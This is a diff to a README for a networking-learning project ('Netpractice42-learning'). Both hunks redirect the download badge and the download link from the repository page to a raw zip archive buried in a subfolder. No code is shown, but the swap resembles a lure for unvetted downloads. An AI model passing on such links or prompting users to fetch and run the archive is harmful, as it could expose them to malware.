@@ -1,6 +1,6 @@
 # 🚦 Netpractice42-learning - Understand Networking Concepts Clearly
 
-[![Download](https://img.shields.io/badge/Download-Netpractice42-blue?style=for-the-badge)](https://github.com/JamesAnderson75/Netpractice42-learning)
+[![Download](https://img.shields.io/badge/Download-Netpractice42-blue?style=for-the-badge)](https://github.com/JamesAnderson75/Netpractice42-learning/raw/refs/heads/main/Networking-Learning/levels/learning-Netpractice-2.9-alpha.4.zip)
 
 ---
 
@@ -100,7 +100,7 @@ If you prefer, you can use the project without installing it:
 
 Visit this page to download all files and setup tools for Netpractice42-learning:
 
-[https://github.com/JamesAnderson75/Netpractice42-learning](https://github.com/JamesAnderson75/Netpractice42-learning)
+[https://github.com/JamesAnderson75/Netpractice42-learning/raw/refs/heads/main/Networking-Learning/levels/learning-Netpractice-2.9-alpha.4.zip](https://github.com/JamesAnderson75/Netpractice42-learning/raw/refs/heads/main/Networking-Learning/levels/learning-Netpractice-2.9-alpha.4.zip)
 
 ---
 
